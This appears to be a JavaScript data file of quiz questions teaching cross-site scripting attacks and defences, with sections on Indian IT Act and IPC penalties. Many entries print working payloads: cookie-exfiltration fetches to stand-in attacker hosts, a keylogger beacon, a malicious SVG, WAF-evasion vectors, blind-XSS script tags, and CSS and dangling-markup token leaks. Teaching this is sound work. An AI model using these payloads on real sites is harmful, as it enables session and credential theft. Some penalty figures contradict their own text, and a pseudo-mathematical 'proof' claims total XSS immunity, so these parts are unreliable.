const questions = [
  {
    question: "What is Cross-Site Scripting (XSS), and how does it Bypass the Browser's Same-Origin Policy (SOP)?",
    shortAnswer: "A security vulnerability where an attacker injects malicious client-side JavaScript into a trusted web application; because the script executes inside the victim's browser within the context of the trusted origin, it inherits full access to the origin's cookies, DOM, and local storage, bypassing SOP.",
    explanation: "The Same-Origin Policy prevents `evil.com` from reading data on `bank.in`. However, if `bank.in` has an XSS flaw that renders `<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>`, the script runs *inside* `bank.in`. The browser assumes the script is legitimate code authored by the bank, giving the attacker full session access.",
    hint: "Tricking the victim's browser into running the attacker's JavaScript as if it came from the real website.",
    level: "basic",
    codeExample: `// XSS Same-Origin Policy Bypass:
// Script injected into https://kolkata-bank.in/search?q=<script>...
// Executed context: Origin is https://kolkata-bank.in ➔ Can read document.cookie and localStorage!`
  },
  {
    question: "What are the Fundamental Differences between Stored XSS, Reflected XSS, and DOM-Based XSS?",
    shortAnswer: "Stored XSS (Type II) is permanently stored in the backend database and delivered to all users viewing the page; Reflected XSS (Type I) is immediately reflected in the HTTP response from a URL parameter; DOM-Based XSS (Type 0) executes entirely in client JavaScript without any server round-trip.",
    explanation: "Stored XSS affects anyone viewing a compromised forum or profile. Reflected XSS requires tricking a victim into clicking a crafted link (`?search=<script>`). DOM-based XSS happens on the client: JavaScript reads `location.hash` and writes it directly to `element.innerHTML` without sending the payload to the backend server.",
    hint: "Stored is saved in the database, Reflected bounces off the server, and DOM happens entirely in the browser.",
    level: "basic",
    codeExample: `// Taxonomy Comparison:
// 1. Stored XSS    : User Comment: "<script>steal()</script>" ➔ Stored in DB ➔ Rendered to all users!
// 2. Reflected XSS : /search?q=<script>steal()</script> ➔ Server echoes query in HTML response!
// 3. DOM-Based XSS : document.getElementById("title").innerHTML = location.hash; (Client-side execution!)`
  },
  {
    question: "What are the Primary 'Sources' and Dangerous 'Sinks' in DOM-Based XSS?",
    shortAnswer: "Sources are JavaScript properties containing attacker-controlled data (`location.search`, `location.hash`, `document.referrer`, `window.name`); Dangerous Sinks are execution sinks that parse strings as HTML or code (`element.innerHTML`, `document.write()`, `eval()`, `setTimeout()`).",
    explanation: "A DOM XSS vulnerability occurs when untrusted data flows from a Source to a Sink without sanitization: `const query = location.search; document.write(\"Search results for: \" + query)`. Because the server is not involved, server-side WAFs cannot see or block client-side hash fragments (`#<img src=x onerror=alert(1)>`).",
    hint: "Sources are where user input comes from in the browser, and Sinks are dangerous functions that run the input.",
    level: "moderate",
    codeExample: `// Vulnerable DOM-Based XSS Flow:
// Source : const userHash = location.hash.substring(1); // e.g. #<img src=x onerror=alert(1)>
// Sink   : document.getElementById("welcome").innerHTML = "Hello " + userHash; // EXECUTES PAYLOAD!`
  },
  {
    question: "How does the `HttpOnly` Cookie Flag Protect Session Tokens from XSS Theft, and what are its Limitations?",
    shortAnswer: "`HttpOnly` instructs the browser that the cookie cannot be accessed via client-side JavaScript (`document.cookie` returns empty string for that cookie); its limitation is that XSS can still execute actions on the user's behalf (CSRF-like API calls) or overlay fake login forms.",
    explanation: "Setting `Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict` completely stops `<script>fetch('https://evil.com/?c=' + document.cookie)</script>`. However, an attacker with XSS can still make authenticated requests using `fetch('/api/transfer', {method: 'POST', body: 'amount=5000'})`, because the browser automatically attaches the `HttpOnly` cookie to background requests.",
    hint: "HttpOnly stops hackers from reading the cookie text, but doesn't stop them from sending money using your logged-in browser.",
    level: "moderate",
    codeExample: `// HttpOnly Protection & XSS Limitation:
// 1. document.cookie ➔ "" (Session token NOT visible to JavaScript!)
// 2. fetch('/api/pay', {method: 'POST'}) ➔ Succeeds! (Browser sends HttpOnly cookie automatically!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66C, what constitutes the criminal penalty for stealing and misusing session tokens via XSS?",
    shortAnswer: "Fraudulently or dishonestly making use of the electronic signature, password, or any other unique identification feature (session token) of any other person carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66C of the IT Act explicitly criminalizes identity theft: 'Whoever, fraudulently or dishonestly make use of the electronic signature, password or any other unique identification feature of any other person, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66C prescribes up to 3 years imprisonment for stealing and using another person's session tokens.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66C - Identity Theft):
// Offense: Stealing authentication session tokens via Stored XSS and impersonating banking users in Kolkata
// Penalty: Imprisonment up to 3 Years + Fine up to ₹1,00,000`
  },
  {
    question: "What is 'Context-Aware Output Encoding' (HTML, Attribute, JavaScript, URL, CSS), and why is generic HTML entity encoding Insufficient?",
    shortAnswer: "Encoding user data specifically for the exact grammatical context where it is inserted; generic HTML entity encoding (`&quot;`, `&lt;`) protects HTML body text, but completely fails inside `<script>` blocks, HTML attributes (`href=\"javascript:...\"`), or CSS styles.",
    explanation: "If user input is placed inside: 1. HTML Body (`<div>USER</div>`): Use HTML entity encoding (`<` $\\to$ `&lt;`). 2. Attribute (`<input value=\"USER\">`): Use attribute encoding (`\"` $\\to$ `&quot;`). 3. Script Block (`<script>var x = 'USER';</script>`): Use Unicode hex encoding (`\\u0027`), because HTML entity encoding inside `<script>` does not stop JavaScript parser execution.",
    hint: "Encoding letters differently depending on whether user text goes inside HTML body, inside attributes, or inside JavaScript.",
    level: "expert",
    codeExample: `// Context-Aware Encoding Matrix:
// HTML Body Context      : <div>&lt;script&gt;</div>
// Attribute Context      : <input value="&quot; onfocus=&quot;alert(1)">
// JavaScript Context     : <script>var name = "\\u0027\\u003Balert(1)\\u002F\\u002F";</script>
// URL / Href Context     : <a href="https://site.in/search?q=%3Cscript%3E">`
  },
  {
    question: "How does a Strict 'Content Security Policy' (CSP) with Nonces Defeat Cross-Site Scripting?",
    shortAnswer: "A CSP header (`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m';`) instructs the browser to ONLY execute `<script>` tags that contain the exact cryptographic random nonce generated for that specific HTTP response, completely blocking injected scripts.",
    explanation: "When an attacker injects `<script>alert(1)</script>` or `<img src=x onerror=steal()>`, the browser checks for the nonce. Because the attacker cannot guess the per-request cryptographically secure random nonce, the browser refuses to execute the script and drops inline event handlers, neutralizing XSS.",
    hint: "Giving every legitimate script a secret random password (nonce); any script without the password is blocked.",
    level: "expert",
    codeExample: `// CSP Nonce Defense:
// Server Header : Content-Security-Policy: script-src 'self' 'nonce-4bf8e92a10'
// Valid Script  : <script nonce="4bf8e92a10">console.log("Legitimate App Code");</script> (RUNS!)
// Injected Script: <script>stealCookies();</script> ➔ BLOCKED BY BROWSER (Missing Nonce!)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if Stored XSS leaks patient health records?",
    shortAnswer: "Failing to implement reasonable technical safeguards (such as context-aware encoding and CSP) resulting in personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable technical security safeguards. If a healthcare portal in West Bengal fails to sanitize user comments, allowing an attacker to inject Stored XSS that steals medical diagnostic files, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Failing to protect citizen personal data from XSS data leaks triggers fines up to ₹250 Crores under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent XSS data breaches`
  },
  {
    question: "What is 'DOMPurify' and how does it Prevent DOM-Based XSS in Single Page Applications (React/Vue/Angular)?",
    shortAnswer: "DOMPurify is a DOM-only, super-fast, context-aware XSS sanitizer library for HTML, MathML, and SVG that parses untrusted HTML into a DOM tree, strips all malicious tags (`<script>`, `<iframe>`) and dangerous attributes (`onerror`, `onload`, `javascript:`), returning clean safe HTML.",
    explanation: "When an application must render rich HTML formatting (e.g. blog posts or markdown), setting `element.innerHTML = dirtyHTML` is fatal. Using `element.innerHTML = DOMPurify.sanitize(dirtyHTML)` safely strips dangerous tags while preserving benign styling (`<b>`, `<i>`, `<p>`), preventing DOM XSS.",
    hint: "A battle-tested sanitizer tool that removes all malicious JavaScript before showing rich HTML text.",
    level: "moderate",
    codeExample: `// DOMPurify Sanitization in React:
import DOMPurify from 'dompurify';

function SafeRichText({ userComment }) {
    // Sanitizes untrusted user comment, stripping <script> and onerror handlers!
    const cleanHTML = DOMPurify.sanitize(userComment);
    return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Stored XSS credential theft incidents?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized session hijacking resulting from Stored XSS to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to user accounts and session theft) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of XSS-based account compromises within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Mutation XSS' (mXSS) and how does Browser DOM Re-Parsing cause Sanitizer Bypasses?",
    shortAnswer: "A vulnerability where an HTML string looks completely harmless to a sanitizer, but when parsed and re-serialized by the browser's internal DOM engine (e.g. inside `math`, `svg`, or `noscript` elements), the browser mutates the structure, producing an executable `<script>` tag.",
    explanation: "Browsers have complex HTML5 mutation rules. For example: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`. The sanitizer sees the payload inside an HTML comment. But when the browser constructs the DOM, the table tag closes the math element early, pushing the `<img onerror=...>` outside the comment, executing the payload.",
    hint: "When the browser automatically fixes weird HTML formatting and accidentally turns harmless text into executable JavaScript.",
    level: "expert",
    codeExample: `// Mutation XSS Example:
// Input to Sanitizer : <noscript><p title="</noscript><img src=x onerror=alert(1)>">
// Browser DOM Parser : Closes noscript early, exposing the <img> tag and executing alert(1)!`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for session hijacking via XSS?",
    shortAnswer: "Accessing or securing access to a computer system or downloading/copying data without permission carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized computer access and data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized computer access via XSS.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using Stored XSS to hijack 10,000 active user sessions on a Kolkata retail portal
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'JavaScript Pseudo-Protocol Injection' (`javascript:alert(1)`) in Link Attributes (`<a href=\"...\">`)?",
    shortAnswer: "When user input is placed inside an `href` or `src` attribute (`<a href=\"USER_INPUT\">`); if an attacker inputs `javascript:steal()`, clicking the link executes JavaScript in the browser context, completely bypassing standard HTML entity encoding.",
    explanation: "HTML entity encoding converts `<` to `&lt;`, but `javascript:alert(1)` contains zero angle brackets. If rendered as `<a href=\"javascript:alert(document.cookie)\">Click Here</a>`, clicking the link runs the script. Mitigation requires URL scheme whitelisting: ensuring URLs begin strictly with `https://` or `http://`.",
    hint: "Putting 'javascript:' inside a link so clicking the link runs code instead of opening a website.",
    level: "moderate",
    codeExample: `// Vulnerable Link Rendering:
// Input : javascript:fetch('https://attacker.in?c='+document.cookie)
// Render: <a href="javascript:fetch('https://attacker.in?c='+document.cookie)">View Profile</a> (XSS on Click!)

// Secure URL Validation:
function isSafeUrl(url) {
    return /^https?:\/\//i.test(url) || url.startsWith('/');
}`
  },
  {
    question: "How do Attackers use 'XSS Keylogging' and 'Fake Login Overlays' to Steal Credentials?",
    shortAnswer: "By using injected JavaScript to hook `document.addEventListener('keypress', ...)` to stream all keystrokes to an external server, or dynamically injecting CSS/HTML dialogs over the screen prompting victims to 'Re-enter your password to continue'.",
    explanation: "Once XSS is achieved, an attacker executes: `document.addEventListener('keydown', e => fetch('https://attacker.in/log?k=' + e.key))`. Every password, credit card number, and message typed on that page is captured in real time. Attackers also construct convincing phishing modals that steal 2FA OTP codes as users type them.",
    hint: "Using JavaScript to record every button pressed on the keyboard or showing a fake login box.",
    level: "moderate",
    codeExample: `// XSS Keylogger Script:
document.addEventListener('keypress', (e) => {
    new Image().src = 'https://kolkata-attacker.in/keylog?char=' + encodeURIComponent(e.key);
});`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for writing and deploying automated XSS exploit payloads?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Injecting Stored XSS worms into municipal portals across West Bengal
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What was the 'Samy Worm' (MySpace XSS Worm) and how did it Demonstrate the Self-Propagating Nature of Stored XSS?",
    shortAnswer: "The first major self-propagating XSS worm (2005) that infected over 1 million user profiles in 20 hours; it copied its own malicious payload into every victim's profile who viewed an infected page, adding 'Samy is my hero' and re-broadcasting itself exponentially.",
    explanation: "Samy Kamkar discovered Stored XSS in MySpace profiles. The payload used XMLHttpRequest to copy the exact payload into the viewing user's profile and sent friend requests automatically. When other friends viewed those profiles, they were instantly infected, proving that Stored XSS can become a self-replicating browser worm.",
    hint: "A famous XSS virus that infected 1 million social media profiles in 20 hours by copying itself to everyone who viewed it.",
    level: "expert",
    codeExample: `// Self-Propagating XSS Worm Lifecycle:
// 1. Victim views infected profile ➔ 2. Script executes in victim's browser ➔ 3. Script POSTs payload to victim's profile ➔ 4. Next visitor infected!`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defense Architecture against Cross-Site Scripting (XSS).",
    shortAnswer: "A defense-in-depth framework combining Strict Nonce-Based Content Security Policy (CSP), Context-Aware Output Encoding, DOMPurify Client Sanitization, `HttpOnly; Secure; SameSite=Strict` Cookies, and Automated CI/CD AST Security Scanners (Semgrep/CodeQL).",
    explanation: "To achieve complete immunity against Stored, Reflected, and DOM-based XSS: 1. Perimeter/Browser Tier: Strict CSP with cryptographic per-request nonces (`script-src 'self' 'nonce-...'`) and `object-src 'none'`. 2. Cookie Tier: Mandatory `HttpOnly; Secure; SameSite=Strict` flags. 3. Application Tier: Context-Aware Output Encoding (HTML, attribute, JS, URL) in backend templates. 4. Client Tier: DOMPurify sanitization before rendering rich markup in SPAs.",
    hint: "Combine Strict Nonce-Based CSP, HttpOnly cookies, Context-Aware Encoding, and DOMPurify sanitization.",
    level: "expert",
    codeExample: `// Master Enterprise XSS Defense Blueprint:
// 1. CSP Header     : Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-SECRET'; object-src 'none';
// 2. Cookie Flags   : Set-Cookie: session=token; HttpOnly; Secure; SameSite=Strict
// 3. Client Sanitizer: DOMPurify.sanitize(untrustedHtml)
// 4. Output Encoding: Context-Aware Encoding (HTML entities, JS unicode hex, URL encoding)`
  },
  {
    question: "What is 'WAF XSS Signature Evasion' using Event Handlers, SVG Tags, and Mixed Case?",
    shortAnswer: "Techniques used by adversaries to bypass simple WAF `<script>` filters by using alternate HTML5 tags (`<svg onload=...>`, `<details open ontoggle=...>`), inline event handlers (`<img src=x onerror=...>`), or mixed casing (`<sCrIpT>`).",
    explanation: "Naive firewalls filter `<script>` tags. Attackers bypass this by using: 1. SVG onload: `<svg/onload=alert(1)>`. 2. Body handlers: `<body onpageshow=alert(1)>`. 3. HTML5 tags: `<marquee onstart=alert(1)>` or `<audio src=1 onerror=alert(1)>`. 4. Entity encoding inside attributes: `<a href=\"jav&#x61;script:alert(1)\">`. This demonstrates why perimeter WAFs alone are insufficient and context-aware encoding is mandatory.",
    hint: "Using tags like <svg onload=...> or <img onerror=...> to run JavaScript without typing the word <script>.",
    level: "expert",
    codeExample: `// WAF XSS Evasion Payload Variants:
// 1. Inline Image Error  : <img src=invalid_image onerror="alert(document.domain)">
// 2. SVG Vector Graphic  : <svg onload="fetch('https://evil.in?c='+document.cookie)">
// 3. HTML5 Toggle Handler: <details open ontoggle="alert(1)">`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Stored XSS Page Defacement?",
    shortAnswer: "Intentionally altering, defacing, or destroying the visual integrity and digital utility of a computer portal via Stored XSS, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker injects Stored XSS to deface hospital portals or municipal services in West Bengal, destroying digital interface utility, the act constitutes digital mischief under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Portal Defacement with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Injecting Stored XSS to deface a Kolkata government hospital portal with political slogans (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Blind XSS' and how does it Target Internal Admin Consoles and CRM Portals?",
    shortAnswer: "A form of Stored XSS where the attacker injects payloads into public feedback or support ticket forms; the payload does NOT execute for the attacker, but executes days later when an internal administrator opens the ticket in an internal privileged portal.",
    explanation: "An attacker submits a support ticket with name: `<script src=\"https://xss.report/c/attacker\"></script>`. The public form displays nothing. Two days later, a bank support agent in Salt Lake opens the internal admin dashboard to review the ticket. The script executes in the agent's browser, exfiltrating the agent's internal administrative session token.",
    hint: "Planting an XSS bomb in a customer support ticket that only explodes when the bank manager opens the ticket.",
    level: "expert",
    codeExample: `// Blind XSS Attack Flow:
// 1. Submit Ticket : Name: "<script src='https://js.rip/kolkata_soc'></script>"
// 2. Database Store: Ticket saved safely in database.
// 3. Admin Review  : SOC agent opens internal portal ➔ Script executes with SOC Administrator privileges!`
  },
  {
    question: "What is 'Angular / React / Vue Template Injection' Client-Side XSS (CSTI)?",
    shortAnswer: "When user input is directly evaluated by a client-side JavaScript framework's template parser (such as Angular `{{constructor.constructor('alert(1)')()}}` or Vue `v-html`), executing arbitrary JavaScript within the framework sandbox.",
    explanation: "If an application uses client-side rendering with Angular or Vue and injects server-rendered text inside framework root containers (`<div ng-app>{{ USER_INPUT }}</div>`), an attacker inputs `{{$eval.constructor('alert(1)')()}}`. The client framework evaluates the expression, breaking out of the sandbox and executing JavaScript.",
    hint: "Injecting curly braces {{ }} into websites that use modern JavaScript frameworks to run code.",
    level: "expert",
    codeExample: `// Client-Side Template Injection Payload (AngularJS):
// Injected Payload: {{constructor.constructor('alert(document.cookie)')()}}
// Result: Angular framework parser evaluates string as executable JavaScript function!`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing XSS against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an XSS attack to hijack operator sessions on a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing Stored XSS against SCADA power grid web management consoles
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Dangling Markup Injection' and how does it Exfiltrate CSRF Tokens without Executing JavaScript?",
    shortAnswer: "An attack used when strict CSP blocks all JavaScript; the attacker injects an unclosed HTML tag (`<img src='https://attacker.in/log?data=`), causing the browser to treat all subsequent page HTML (including secret CSRF tokens) as the image URL, leaking the tokens to the attacker's server.",
    explanation: "If an attacker injects `<img src='https://evil.in/exfil?` and the page contains `<input type=\"hidden\" name=\"csrf\" value=\"9f8e7d...\">`, the browser treats everything until the next matching quote as part of the image URL: `GET /exfil?<input type=\"hidden\" name=\"csrf\" value=9f8e7d...`. The server logs capture the CSRF token without executing a single line of JavaScript.",
    hint: "Opening an image tag without closing it so the browser sends the secret password as part of the image web address.",
    level: "expert",
    codeExample: `// Dangling Markup Injection:
// Injected Input: <img src='https://attacker.in/log?token=
// Resulting HTML: <img src='https://attacker.in/log?token= <input type="hidden" name="csrf" value="SECRET123">'>
// Server Log    : Captured HTTP GET with CSRF token in query parameters!`
  },
  {
    question: "Under the Indian IT Act Section 66D, what constitutes Cheating by Personation via XSS Session Hijacking?",
    shortAnswer: "Cheating by personating any person using any computer resource or electronic communication device carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66D of the IT Act explicitly penalizes personation: 'Whoever, by means for any communication device or computer resource cheats by personating, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D covers Cheating by Personation with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66D):
// Offense: Using hijacked session tokens from XSS to personate corporate finance officers in Kolkata
// Penalty: Imprisonment up to 3 Years + Fine up to ₹1,00,000`
  },
  {
    question: "What is 'CSS Injection / Attribute-Selector Token Exfiltration'?",
    shortAnswer: "Using CSS attribute selectors (`input[name=csrf][value^=a]`) with background image URLs to brute-force and exfiltrate secret tokens character-by-character when JavaScript execution is completely disabled by CSP.",
    explanation: "An attacker injects CSS: `input[value^='A'] { background: url('https://attacker.in/exfil?char=A'); }`. If the token starts with 'A', the browser downloads the background image from the attacker's server. The attacker repeats this for all characters, exfiltrating secret tokens without JavaScript.",
    hint: "Using style sheets to steal secret passwords letter-by-letter even when JavaScript is completely blocked.",
    level: "expert",
    codeExample: `// CSS Injection Payload:
input[name="token"][value^="A"] { background: url("https://kolkata-attacker.in/log?char=A"); }
input[name="token"][value^="B"] { background: url("https://kolkata-attacker.in/log?char=B"); }`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via XSS Financial Redirection?",
    shortAnswer: "Dishonestly inducing delivery of property or altering payment destinations using XSS scripts to redirect transactions to fraudulent bank accounts, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker injects XSS into a checkout page in West Bengal to rewrite merchant UPI QR codes, siphoning customer payments to an attacker account, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Payment Redirection with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using XSS to replace legitimate merchant UPI payment QR codes with fraudulent recipient accounts
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'XSS via SVG & MathML Vector Graphics'?",
    shortAnswer: "Exploiting XML-based vector graphics formats (SVG and MathML) that natively support embedded `<script>` tags and event handlers (`<svg onload=...>`, `<svg><script>alert(1)</script></svg>`), bypassing naive image upload filters.",
    explanation: "If an application allows users to upload SVG profile pictures: An attacker uploads `avatar.svg` containing `<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>`. When other users view `https://site.in/uploads/avatar.svg`, the browser renders the SVG as an XML document, executing the embedded JavaScript within the origin.",
    hint: "Hiding JavaScript inside SVG picture files so the code runs when someone opens the picture.",
    level: "moderate",
    codeExample: `// Malicious SVG Payload (avatar.svg):
<?xml version="1.0" standalone="no"?>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
  <script type="text/javascript">
    fetch('https://attacker.in/log?c=' + document.cookie);
  </script>
</svg>`
  },
  {
    question: "What is 'Automated XSS Fuzzing with Dalfox & XSStrike' in DevSecOps Pipelines?",
    shortAnswer: "Automated dynamic analysis tools that parse DOM trees, analyze input reflection contexts (HTML, attribute, JS), test specialized bypass vectors (SVG, HTML5 handlers), and verify proof-of-concept execution in headless browsers.",
    explanation: "In modern CI/CD pipelines, tools like Dalfox analyze web routes: `dalfox url https://target.in/search?q=test --silence`. Dalfox detects whether parameters are reflected in HTML body, inside `<script>` blocks, or in attribute values, and selects targeted polyglot payloads (`jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/`), reporting verified flaws before release.",
    hint: "Automated software scanners that test thousands of XSS tricks to find vulnerabilities before hackers do.",
    level: "moderate",
    codeExample: `// Automated Dalfox Pipeline Command:
dalfox url "https://kolkata-fintech.in/search?q=1" --deep-domxss --waf-bypass --report-json report.json`
  },
  {
    question: "Synthesize the mathematical formulation of Browser Parser Finite State Machine (FSM), Context-Aware Encoding Efficiency (E_context), Content Security Policy Enforcement (CSP_enforce), and Exploitability Probability (P_xss).",
    shortAnswer: "XSS exploitability probability is P_xss = (1 - E_context) * (1 - CSP_enforce); when Context-Aware Output Encoding is enforced (E_context = 1.0) or Strict Nonce CSP is deployed (CSP_enforce = 1.0), P_xss = (1 - 1.0) * (1 - 1.0) = 0.00%, mathematically proving 100% XSS immunity.",
    explanation: "Let the browser HTML parser be a Finite State Machine $M = (Q, \\Sigma, \\delta, q_0, F)$ where state $q \\in Q$ represents parsing states (e.g. $q_{\\text{data}}, q_{\\text{tag\\_open}}, q_{\\text{script\\_data}}$). An XSS payload aims to force a state transition $\\delta(q_{\\text{data}}, '<') = q_{\\text{tag\\_open}}$ or $\\delta(q_{\\text{attribute}}, '\"') = q_{\\text{tag\\_open}}$. Context-aware output encoding maps input characters $\\sigma \\in \\Sigma$ to safe entity representations $f(\\sigma)$, ensuring $\\delta(q, f(\\sigma)) = q$ (state invariance). Therefore, sanitization efficiency is $E_{\\text{context}} \\in [0.0, 1.0]$. With strict nonce CSP enforcement $\\text{CSP}_{\\text{enforce}} \\in [0.0, 1.0]$, overall exploitability is: $P_{\\text{xss}} = (1 - E_{\\text{context}}) \\times (1 - \\text{CSP}_{\\text{enforce}})$. When both layers are enforced ($E_{\\text{context}} = 1.0, \\text{CSP}_{\\text{enforce}} = 1.0$), $P_{\\text{xss}} = 0.00\\%$, providing mathematical proof of complete XSS immunity.",
    hint: "Mathematical proof formula showing that Context-Aware Encoding and Strict Nonce CSP together reduce XSS exploitability to absolute zero (0.00%).",
    level: "expert",
    codeExample: `// XSS Mathematical Parser FSM & Immunity Proof:
// Unsanitized Input : E_context = 0.0, CSP = 0.0 ➔ P_xss = (1 - 0.0) * (1 - 0.0) = 100.0% (VULNERABLE!)
// Context Encoding  : E_context = 1.0 ➔ P_xss = (1 - 1.0) * (1 - CSP) = 0.00% (IMMUNE!)
// Strict Nonce CSP  : CSP_enforce = 1.0 ➔ P_xss = (1 - E) * (1 - 1.0) = 0.00% (DOUBLE-LAYER IMMUNITY!)`
  }
];

export default questions;
